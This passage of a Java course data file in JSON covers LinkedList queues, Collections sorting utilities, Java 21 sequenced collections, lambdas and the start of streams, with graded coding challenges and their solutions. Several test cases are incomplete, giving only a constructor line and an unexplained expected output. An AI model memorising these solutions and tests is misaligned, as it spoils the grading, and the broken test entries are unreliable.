              "content": "```java\nA QUEUE is FIFO (First In, First Out) like a line at a store:\n\nLinkedList<String> queue = new LinkedList<>();\n\n// People join the line (add to end)\nqueue.addLast(\"Alice\");\nqueue.addLast(\"Bob\");\nqueue.addLast(\"Carol\");\n\n// Serve customers (remove from front)\nString first = queue.removeFirst();  // \"Alice\"\nString second = queue.removeFirst(); // \"Bob\"\n\n// Who's next?\nString next = queue.getFirst();  // \"Carol\" (peek without removing)\n\nLinkedList is PERFECT for queues because:\n- addLast() is O(1)\n- removeFirst() is O(1)\nBoth operations are FAST!\n```"
            },
            {
              "type": "WARNING",
              "title": "LinkedList Pitfalls",
              "content": "NoSuchElementException:\nLinkedList<String> list = new LinkedList<>();\nlist.getFirst();  // CRASH! List is empty\n\nUse peekFirst() for null-safe access:\nString first = list.peekFirst();  // Returns null if empty\n\nRandom access is SLOW:\nlist.get(500);  // Must traverse 500 nodes! O(n)\nUse ArrayList if you need fast random access.\n\nMemory overhead:\nEach element has prev/next pointers - more memory than ArrayList.\n\nJava 21+ Sequenced Collections:\nLinkedList implements SequencedCollection.\nNew methods: reversed() returns reversed view."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-4-queue",
              "title": "Simple Task Queue",
              "description": "Create a TaskQueue class with:\n- LinkedList<String> field named tasks\n- Constructor that initializes tasks\n- enqueue(String task) method (add to end)\n- dequeue() method (remove and return first task, or null if empty)\n- size() method",
              "instructions": "Create a TaskQueue class with:\n- LinkedList<String> field named tasks\n- Constructor that initializes tasks\n- enqueue(String task) method (add to end)\n- dequeue() method (remove and return first task, or null if empty)\n- size() method",
              "starterCode": "import java.util.LinkedList;\n\npublic class TaskQueue {\n    // Your code here\n}",
              "solution": "// Solution: Simple Task Queue\n// This demonstrates using LinkedList as a FIFO queue\n\nimport java.util.LinkedList;\n\npublic class TaskQueue {\n    // LinkedList for efficient add/remove at ends\n    LinkedList<String> tasks;\n    \n    // Constructor initializes the LinkedList\n    public TaskQueue() {\n        tasks = new LinkedList<>();\n    }\n    \n    // Enqueue: add to end of queue\n    public void enqueue(String task) {\n        tasks.addLast(task);\n    }\n    \n    // Dequeue: remove and return first task\n    public String dequeue() {\n        // Return null if queue is empty\n        if (tasks.isEmpty()) {\n            return null;\n        }\n        return tasks.removeFirst();\n    }\n    \n    // Get current queue size\n    public int size() {\n        return tasks.size();\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-4-queue-test-1",
                  "description": "TaskQueue q = new TaskQueue();\n",
                  "expectedOutput": "2",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-4-queue-test-2",
                  "description": "TaskQueue q = new TaskQueue();\n",
                  "expectedOutput": "First",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-4-queue-test-3",
                  "description": "TaskQueue q = new TaskQueue();\n",
                  "expectedOutput": "B",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-4-queue-test-4",
                  "description": "TaskQueue q = new TaskQueue();\n",
                  "expectedOutput": "null",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-3-lesson-5",
          "title": "Lesson 5.5: Sorting, Searching, and Collection Utilities",
          "moduleId": "module-05",
          "order": 5,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Collections Need Common Operations",
              "content": "You've learned:\n- ArrayList for dynamic lists\n- HashMap for key-value pairs\n- LinkedList for queue-like structures\n\nBut you often need to:\n- SORT a list (alphabetically, numerically)\n- SEARCH for an element\n- SHUFFLE elements\n- Find MAX/MIN values\n- REVERSE order\n\nGood news: Java provides Collections utility class with methods for all of this!"
            },
            {
              "type": "THEORY",
              "title": "Collections.sort() - Sorting Lists",
              "content": "IMPORT:\nimport java.util.Collections;\n\nSORTING NUMBERS:\nArrayList<Integer> numbers = new ArrayList<>();\nnumbers.add(5);\nnumbers.add(2);\nnumbers.add(8);\nnumbers.add(1);\n\nCollections.sort(numbers);  // Sorts IN PLACE\n// Now: [1, 2, 5, 8]\n\nSORTING STRINGS:\nArrayList<String> names = new ArrayList<>();\nnames.add(\"Charlie\");\nnames.add(\"Alice\");\nnames.add(\"Bob\");\n\nCollections.sort(names);  // Alphabetical\n// Now: [\"Alice\", \"Bob\", \"Charlie\"]\n\nREVERSE SORT:\nCollections.sort(numbers, Collections.reverseOrder());\n// Now: [8, 5, 2, 1]"
            },
            {
              "type": "THEORY",
              "title": "Other Useful Collections Methods",
              "content": "REVERSE:\nCollections.reverse(list);  // Reverse the order\n\nSHUFFLE:\nCollections.shuffle(list);  // Randomize order\n\nMAX AND MIN:\nArrayList<Integer> nums = new ArrayList<>();\nnums.add(5);\nnums.add(2);\nnums.add(9);\nint max = Collections.max(nums);  // 9\nint min = Collections.min(nums);  // 2\n\nFREQUENCY:\nArrayList<String> items = new ArrayList<>();\nitems.add(\"apple\");\nitems.add(\"banana\");\nitems.add(\"apple\");\nint count = Collections.frequency(items, \"apple\");  // 2\n\nFILL:\nCollections.fill(list, \"X\");  // Replace all with \"X\""
            },
            {
              "type": "THEORY",
              "title": "Enhanced For Loop (for-each)",
              "content": "The EASIEST way to iterate through collections:\n\nArrayList<String> fruits = new ArrayList<>();\nfruits.add(\"Apple\");\nfruits.add(\"Banana\");\nfruits.add(\"Cherry\");\n\n// Traditional for loop\nfor (int i = 0; i < fruits.size(); i++) {\n    System.out.println(fruits.get(i));\n}\n\n// Enhanced for loop (for-each)\nfor (String fruit : fruits) {  // Read as: \"for each fruit in fruits\"\n    System.out.println(fruit);\n}\n\nBenefits:\n- Cleaner syntax\n- No index errors\n- Works with ANY collection\n\nWorks with HashMap too:\nHashMap<String, Integer> ages = new HashMap<>();\nfor (String key : ages.keySet()) {\n    System.out.println(key + \": \" + ages.get(key));\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "The Collection Interface Hierarchy",
              "content": "All collections implement common interfaces:\n\nCollection (interface)\n  |\n  ├─ List (interface)\n  │   ├─ ArrayList (class)\n  │   └─ LinkedList (class)\n  │\n  ├─ Set (interface) - No duplicates\n  │   ├─ HashSet (class)\n  │   └─ TreeSet (class) - Sorted\n  │\n  └─ Queue (interface)\n      └─ LinkedList (class)\n\nMap (separate hierarchy)\n  ├─ HashMap (class)\n  ├─ LinkedHashMap (maintains order)\n  └─ TreeMap (sorted by key)\n\nCommon methods ALL collections share:\n- add(element)\n- remove(element)\n- size()\n- isEmpty()\n- clear()\n- contains(element)"
            },
            {
              "type": "KEY_POINT",
              "title": "Java 21: Sequenced Collections (JEP 431)",
              "content": "Java 21 introduced three new interfaces for ordered collections:\n\nSequencedCollection<E> - ordered with first/last access:\n- getFirst() / getLast() - get elements\n- addFirst(e) / addLast(e) - add elements\n- removeFirst() / removeLast() - remove elements\n- reversed() - returns reversed view\n\nImplemented by: List, Deque, LinkedHashSet, SortedSet\n\nSequencedSet<E> extends SequencedCollection<E>:\n- Same methods, but no duplicates\n- addFirst()/addLast() repositions existing elements\n\nImplemented by: LinkedHashSet, TreeSet\n\nSequencedMap<K,V> - ordered key-value pairs:\n- firstEntry() / lastEntry()\n- pollFirstEntry() / pollLastEntry()\n- putFirst(k,v) / putLast(k,v)\n- sequencedKeySet() / sequencedValues() / sequencedEntrySet()\n\nImplemented by: LinkedHashMap, TreeMap\n\nNote: HashMap/HashSet do NOT implement these (no order)!"
            },
            {
              "type": "THEORY",
              "title": "Using Sequenced Collections (Java 21+)",
              "content": "BEFORE Java 21:\nArrayList<String> list = new ArrayList<>();\nlist.add(\"A\"); list.add(\"B\"); list.add(\"C\");\n\nString first = list.get(0);  // Must use index\nString last = list.get(list.size() - 1);  // Awkward!\n\nAFTER Java 21:\nString first = list.getFirst();  // Clean!\nString last = list.getLast();    // Clean!\n\nREVERSED VIEW:\nList<String> reversed = list.reversed();\nfor (String s : reversed) {\n    System.out.println(s);  // Prints C, B, A\n}\n// Original list unchanged - reversed is a VIEW\n\nLINKEDHASHSET WITH ORDERING:\nLinkedHashSet<String> set = new LinkedHashSet<>();\nset.add(\"X\"); set.add(\"Y\"); set.add(\"Z\");\nset.addFirst(\"NEW\");  // Moves or adds to front\n// Now: [NEW, X, Y, Z]\n\nLINKEDHASHMAP ENTRIES:\nLinkedHashMap<String, Integer> map = new LinkedHashMap<>();\nmap.put(\"A\", 1); map.put(\"B\", 2);\nMap.Entry<String, Integer> first = map.firstEntry();  // A=1\nMap.Entry<String, Integer> last = map.lastEntry();    // B=2"
            },
            {
              "type": "THEORY",
              "title": "💻 Real-World Example: Leaderboard",
              "content": "```java\nBuilding a game leaderboard:\n\nimport java.util.*;\n\nclass Player {\n    String name;\n    int score;\n    \n    Player(String name, int score) {\n        this.name = name;\n        this.score = score;\n    }\n}\n\nArrayList<Player> players = new ArrayList<>();\nplayers.add(new Player(\"Alice\", 500));\nplayers.add(new Player(\"Bob\", 750));\nplayers.add(new Player(\"Carol\", 300));\n\n// Sort by score (highest first)\nCollections.sort(players, (p1, p2) -> p2.score - p1.score);\n\n// Display leaderboard\nfor (int i = 0; i < players.size(); i++) {\n    Player p = players.get(i);\n    System.out.println((i+1) + \". \" + p.name + \": \" + p.score);\n}\n\nOutput:\n1. Bob: 750\n2. Alice: 500\n3. Carol: 300\n```"
            },
            {
              "type": "WARNING",
              "title": "Sorting and Collections Pitfalls",
              "content": "Collections.sort() modifies in place:\nList<Integer> nums = List.of(3, 1, 2);\nCollections.sort(nums);  // CRASH! List.of() returns immutable list\n\nUse mutable list:\nList<Integer> nums = new ArrayList<>(List.of(3, 1, 2));\nCollections.sort(nums);  // OK\n\nComparable vs Comparator:\nCustom objects need Comparable or explicit Comparator:\nCollections.sort(people, Comparator.comparing(Person::getName));\n\nNull elements cause NullPointerException:\nCollections.sort(listWithNulls);  // CRASH!\nUse Comparator.nullsFirst() or nullsLast().\n\nJava 21+ Sequenced Collections Compatibility:\nIf your class implements List and defines getFirst() with a different signature, you'll get a compile error when upgrading to Java 21. The new SequencedCollection interface defines getFirst()/getLast() which List now inherits."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-5-sort",
              "title": "Sort Numbers",
              "description": "Create a class with method sortNumbers(ArrayList<Integer> nums) that:\n- Sorts the list in ascending order\n- Returns the sorted list\nUse Collections.sort()",
              "instructions": "Create a class with method sortNumbers(ArrayList<Integer> nums) that:\n- Sorts the list in ascending order\n- Returns the sorted list\nUse Collections.sort()",
              "starterCode": "import java.util.ArrayList;\nimport java.util.Collections;\n\npublic class Sorter {\n    public static ArrayList<Integer> sortNumbers(ArrayList<Integer> nums) {\n        // Your code here\n    }\n}",
              "solution": "// Solution: Sort Numbers\n// This demonstrates using Collections.sort()\n\nimport java.util.ArrayList;\nimport java.util.Collections;\n\npublic class Sorter {\n    public static ArrayList<Integer> sortNumbers(ArrayList<Integer> nums) {\n        // Collections.sort modifies the list in-place\n        Collections.sort(nums);\n        \n        // Return the sorted list\n        return nums;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-5-sort-test-1",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "1",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-5-sort-test-2",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "8",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-5-sort-test-3",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "75",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-5-maxmin",
              "title": "Find Max and Min",
              "description": "Create a class with method getRange(ArrayList<Integer> nums) that:\n- Returns the difference between max and min values\nUse Collections.max() and Collections.min()",
              "instructions": "Create a class with method getRange(ArrayList<Integer> nums) that:\n- Returns the difference between max and min values\nUse Collections.max() and Collections.min()",
              "starterCode": "import java.util.ArrayList;\nimport java.util.Collections;\n\npublic class RangeFinder {\n    public static int getRange(ArrayList<Integer> nums) {\n        // Your code here\n    }\n}",
              "solution": "// Solution: Find Max and Min\n// This demonstrates using Collections.max() and min()\n\nimport java.util.ArrayList;\nimport java.util.Collections;\n\npublic class RangeFinder {\n    public static int getRange(ArrayList<Integer> nums) {\n        // Get the maximum value\n        int max = Collections.max(nums);\n        \n        // Get the minimum value\n        int min = Collections.min(nums);\n        \n        // Return the difference (range)\n        return max - min;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-5-maxmin-test-1",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "8",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-5-maxmin-test-2",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "50",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-5-top",
              "title": "Get Top Scores",
              "description": "Create a class with method getTopThree(ArrayList<Integer> scores) that:\n- Returns a new ArrayList with the top 3 highest scores in descending order\n- If less than 3 scores, return all of them sorted\nHint: Sort in reverse order and take first 3",
              "instructions": "Create a class with method getTopThree(ArrayList<Integer> scores) that:\n- Returns a new ArrayList with the top 3 highest scores in descending order\n- If less than 3 scores, return all of them sorted\nHint: Sort in reverse order and take first 3",
              "starterCode": "import java.util.ArrayList;\nimport java.util.Collections;\n\npublic class TopScores {\n    public static ArrayList<Integer> getTopThree(ArrayList<Integer> scores) {\n        // Your code here\n    }\n}",
              "solution": "// Solution: Get Top Scores\n// This demonstrates sorting in reverse order and sublist\n\nimport java.util.ArrayList;\nimport java.util.Collections;\n\npublic class TopScores {\n    public static ArrayList<Integer> getTopThree(ArrayList<Integer> scores) {\n        // Sort in descending order (highest first)\n        Collections.sort(scores, Collections.reverseOrder());\n        \n        // Create result list\n        ArrayList<Integer> result = new ArrayList<>();\n        \n        // Take up to 3 elements (or all if less than 3)\n        int count = Math.min(3, scores.size());\n        for (int i = 0; i < count; i++) {\n            result.add(scores.get(i));\n        }\n        \n        return result;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-5-top-test-1",
                  "description": "ArrayList<Integer> scores = new ArrayList<>();\n",
                  "expectedOutput": "3",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-5-top-test-2",
                  "description": "ArrayList<Integer> scores = new ArrayList<>();\n",
                  "expectedOutput": "95",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-5-top-test-3",
                  "description": "ArrayList<Integer> scores = new ArrayList<>();\n",
                  "expectedOutput": "88",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-3-lesson-6",
          "title": "Lesson 5.6: Lambda Expressions - Functions as Data (Java 8+)",
          "moduleId": "module-05",
          "order": 6,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Passing Behavior Around",
              "content": "Imagine you want to sort a list of names by length instead of alphabetically:\n\n// Traditional way: Create a whole class just to pass behavior\nclass LengthComparator implements Comparator<String> {\n    public int compare(String a, String b) {\n        return a.length() - b.length();\n    }\n}\nCollections.sort(names, new LengthComparator());\n\n// Or use anonymous class (still verbose)\nCollections.sort(names, new Comparator<String>() {\n    public int compare(String a, String b) {\n        return a.length() - b.length();\n    }\n});\n\nThat's A LOT of code just to say: \"sort by length\"!\n\nJava 8 introduced LAMBDA EXPRESSIONS to pass behavior in a concise way:\n\nCollections.sort(names, (a, b) -> a.length() - b.length());\n\nOne line instead of 5+!"
            },
            {
              "type": "KEY_POINT",
              "title": "Lambda Syntax Explained",
              "content": "A lambda is an anonymous function you can pass around:\n\n(parameters) -> expression\n  or\n(parameters) -> { statements; }\n\nEXAMPLES:\n\n// No parameters\n() -> System.out.println(\"Hello\")\n\n// One parameter (parentheses optional)\nx -> x * 2\n(x) -> x * 2\n\n// Two parameters\n(a, b) -> a + b\n\n// With types (optional)\n(String s) -> s.length()\n(int a, int b) -> a + b\n\n// Multi-line with braces (must use return)\n(a, b) -> {\n    int sum = a + b;\n    return sum * 2;\n}\n\nKEY RULES:\n1. Types are usually inferred (don't need to specify)\n2. Single expression: no braces, implicit return\n3. Multiple statements: need braces and explicit return"
            },
            {
              "type": "THEORY",
              "title": "Functional Interfaces",
              "content": "Lambdas can only be used where a FUNCTIONAL INTERFACE is expected.\n\nA functional interface has exactly ONE abstract method:\n\n@FunctionalInterface\ninterface Calculator {\n    int calculate(int a, int b);  // ONE abstract method\n}\n\n// Use lambda to implement it\nCalculator add = (a, b) -> a + b;\nCalculator multiply = (a, b) -> a * b;\n\nSystem.out.println(add.calculate(5, 3));      // 8\nSystem.out.println(multiply.calculate(5, 3)); // 15\n\nCOMMON BUILT-IN FUNCTIONAL INTERFACES:\n\n1. Predicate<T> - takes T, returns boolean\n   Predicate<String> isEmpty = s -> s.isEmpty();\n\n2. Function<T, R> - takes T, returns R\n   Function<String, Integer> length = s -> s.length();\n\n3. Consumer<T> - takes T, returns nothing\n   Consumer<String> printer = s -> System.out.println(s);\n\n4. Supplier<T> - takes nothing, returns T\n   Supplier<Double> random = () -> Math.random();\n\n5. Comparator<T> - takes two T, returns int\n   Comparator<String> byLength = (a, b) -> a.length() - b.length();"
            },
            {
              "type": "KEY_POINT",
              "title": "Method References",
              "content": "When a lambda just calls an existing method, use a method reference:\n\n// Lambda that calls a method\nlist.forEach(s -> System.out.println(s));\n\n// Method reference (cleaner!)\nlist.forEach(System.out::println);\n\nFOUR TYPES OF METHOD REFERENCES:\n\n1. Static method: ClassName::staticMethod\n   Function<String, Integer> parse = Integer::parseInt;\n   // Same as: s -> Integer.parseInt(s)\n\n2. Instance method of a particular object: object::method\n   String prefix = \"Hello, \";\n   Function<String, String> greeter = prefix::concat;\n   // Same as: s -> prefix.concat(s)\n\n3. Instance method of an arbitrary object: ClassName::method\n   Function<String, String> upper = String::toUpperCase;\n   // Same as: s -> s.toUpperCase()\n\n4. Constructor reference: ClassName::new\n   Supplier<ArrayList<String>> listMaker = ArrayList::new;\n   // Same as: () -> new ArrayList<String>()\n\nMethod references are cleaner when the lambda just delegates to a method."
            },
            {
              "type": "EXAMPLE",
              "title": "Lambdas in Action",
              "content": "Lambdas work with functional interfaces like Comparator, Predicate, Function, and Consumer. Method references (::) provide cleaner syntax when a lambda just calls an existing method.",
              "code": "import java.util.*;\nimport java.util.function.*;\n\npublic class LambdaDemo {\n    public static void main(String[] args) {\n        // Lambda as Comparator\n        List<String> names = new ArrayList<>(List.of(\"Alice\", \"Bob\", \"Charlie\", \"Dan\"));\n        names.sort((a, b) -> a.length() - b.length());\n        System.out.println(names); // [Bob, Dan, Alice, Charlie]\n        \n        // Lambda with forEach\n        names.forEach(name -> System.out.println(\"Hello, \" + name));\n        \n        // Method reference\n        names.forEach(System.out::println);\n        \n        // Predicate - filter condition\n        Predicate<String> startsWithA = s -> s.startsWith(\"A\");\n        System.out.println(startsWithA.test(\"Alice\")); // true\n        System.out.println(startsWithA.test(\"Bob\"));   // false\n        \n        // Function - transform\n        Function<String, Integer> getLength = String::length;\n        System.out.println(getLength.apply(\"Hello\")); // 5\n        \n        // Consumer - action\n        Consumer<String> shout = s -> System.out.println(s.toUpperCase() + \"!\");\n        shout.accept(\"hello\"); // HELLO!\n        \n        // Custom functional interface\n        Calculator add = (a, b) -> a + b;\n        Calculator multiply = (a, b) -> a * b;\n        System.out.println(operate(10, 5, add));      // 15\n        System.out.println(operate(10, 5, multiply)); // 50\n    }\n    \n    @FunctionalInterface\n    interface Calculator {\n        int calculate(int a, int b);\n    }\n    \n    static int operate(int a, int b, Calculator calc) {\n        return calc.calculate(a, b);\n    }\n}",
              "language": "java"
            },
            {
              "type": "WARNING",
              "title": "Lambda Expression Pitfalls",
              "content": "Capturing mutable variables:\nint count = 0;\nlist.forEach(s -> count++);  // COMPILE ERROR!\nVariables captured by lambdas must be effectively final.\n\nUse AtomicInteger for counters:\nAtomicInteger count = new AtomicInteger(0);\nlist.forEach(s -> count.incrementAndGet());\n\nShadowing parameters:\n(String s) -> { String s = \"test\"; }  // COMPILE ERROR!\nParameter names cannot be reused inside lambda body.\n\nReturn type ambiguity:\nComparator<String> c = (a, b) -> { a.length() - b.length(); };  // MISSING RETURN!\nWith braces, you need explicit return:\nComparator<String> c = (a, b) -> { return a.length() - b.length(); };\n\nException handling:\nLambdas cannot throw checked exceptions unless functional interface declares them."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-6-lambda-basic",
              "title": "Basic Lambda Expression",
              "description": "Create a list of names and sort it by length (shortest first) using a lambda.\n\nList: [\"Charlie\", \"Bob\", \"Alice\", \"Dan\"]\n\nPrint the first name after sorting.\n\nExpected output: Bob",
              "instructions": "Create a list of names and sort it by length (shortest first) using a lambda.\n\nList: [\"Charlie\", \"Bob\", \"Alice\", \"Dan\"]\n\nPrint the first name after sorting.",
              "starterCode": "import module java.base;\n\nvoid main() {\n    // Create and sort the list\n}",
              "solution": "import module java.base;\n\nvoid main() {\n    var names = new ArrayList<>(List.of(\"Charlie\", \"Bob\", \"Alice\", \"Dan\"));\n    names.sort((a, b) -> a.length() - b.length());\n    println(names.get(0));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-6-lambda-basic-test-1",
                  "description": "Should print 'Bob'",
                  "expectedOutput": "Bob",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use list.sort((a, b) -> comparison) with a lambda"
                },
                {
                  "level": 2,
                  "text": "Compare lengths: a.length() - b.length() for ascending order"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using Arrays.asList() which returns fixed-size list",
                  "consequence": "UnsupportedOperationException when sorting",
                  "correction": "Wrap with new ArrayList<>() to make it mutable"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-6-method-ref",
              "title": "Method Reference",
              "description": "Create a list of names and use forEach with a method reference to print each name.\n\nList: [\"Alice\", \"Bob\"]\n\nExpected output:\nAlice\nBob",
              "instructions": "Create a list of names and use forEach with a method reference to print each name.\n\nList: [\"Alice\", \"Bob\"]",
              "starterCode": "import module java.base;\n\nvoid main() {\n    // Use forEach with method reference\n}",
              "solution": "import module java.base;\n\nvoid main() {\n    var names = List.of(\"Alice\", \"Bob\");\n    names.forEach(System.out::println);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-6-method-ref-test-1",
                  "description": "Should print names",
                  "expectedOutput": "Alice\nBob",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Method reference syntax: ClassName::methodName or object::methodName"
                },
                {
                  "level": 2,
                  "text": "System.out::println is a method reference to the println method"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using System.out.println() with parentheses in method reference",
                  "consequence": "Compilation error",
                  "correction": "Use System.out::println (double colon, no parentheses)"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-3-lesson-7",
          "title": "Lesson 5.7: Streams - Functional Collection Processing (Java 8+)",
          "moduleId": "module-05",
          "order": 7,
          "estimatedMinutes": 50,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Verbose Collection Processing",
              "content": "Traditional way to filter and transform a list:\n\n// Get names longer than 3 characters, convert to uppercase\nList<String> names = List.of(\"Alice\", \"Bob\", \"Charlie\", \"Dan\");\nList<String> result = new ArrayList<>();\n\nfor (String name : names) {\n    if (name.length() > 3) {           // Filter\n        result.add(name.toUpperCase());  // Transform\n    }\n}\n// result: [ALICE, CHARLIE]\n\nProblems:\n1. Very verbose (5+ lines for simple operation)\n2. Mixes what we want with how to do it\n3. Hard to parallelize\n4. Lots of mutable state\n\nWith STREAMS:\n\nList<String> result = names.stream()\n    .filter(name -> name.length() > 3)\n    .map(String::toUpperCase)\n    .collect(Collectors.toList());\n\nCleaner, more readable, and easily parallelizable!"
            },
            {
              "type": "KEY_POINT",
              "title": "Stream Pipeline Structure",
              "content": "A stream pipeline has three parts:\n\n1. SOURCE - Where data comes from\n   list.stream()           // From collection\n   Arrays.stream(array)    // From array\n   Stream.of(a, b, c)      // From values\n   Stream.iterate(0, n -> n + 1)  // Generated\n\n2. INTERMEDIATE OPERATIONS - Transform the stream (lazy!)\n   .filter(predicate)      // Keep matching elements\n   .map(function)          // Transform each element\n   .sorted()               // Sort elements\n   .distinct()             // Remove duplicates\n   .limit(n)               // Take first n\n   .skip(n)                // Skip first n\n\n3. TERMINAL OPERATION - Produce result (triggers processing)\n   .collect(Collectors.toList())  // To list\n   .forEach(consumer)      // Do something with each\n   .count()                // Count elements\n   .findFirst()            // Get first (Optional)\n   .reduce(identity, accumulator)  // Combine to one\n   .anyMatch(predicate)    // Any match?\n   .allMatch(predicate)    // All match?\n\nKEY: Streams are LAZY - nothing happens until terminal operation!"
            },
            {
              "type": "THEORY",
              "title": "Common Stream Operations",
              "content": "FILTER - Keep elements matching condition\nList<Integer> evens = numbers.stream()\n    .filter(n -> n % 2 == 0)\n    .collect(Collectors.toList());\n\nMAP - Transform each element\nList<Integer> lengths = names.stream()\n    .map(String::length)\n    .collect(Collectors.toList());\n\nSORTED - Sort elements\nList<String> sorted = names.stream()\n    .sorted()  // Natural order\n    .collect(Collectors.toList());\n\nList<String> byLength = names.stream()\n    .sorted(Comparator.comparing(String::length))\n    .collect(Collectors.toList());\n\nDISTINCT - Remove duplicates\nList<Integer> unique = numbers.stream()\n    .distinct()\n    .collect(Collectors.toList());\n\nLIMIT and SKIP - Pagination\nList<String> page = names.stream()\n    .skip(10)      // Skip first 10\n    .limit(5)      // Take next 5\n    .collect(Collectors.toList());\n\nFLATMAP - Flatten nested streams\nList<String> allWords = sentences.stream()\n    .flatMap(s -> Arrays.stream(s.split(\" \")))\n    .collect(Collectors.toList());"
            },
            {
              "type": "KEY_POINT",
              "title": "Collectors and Terminal Operations",
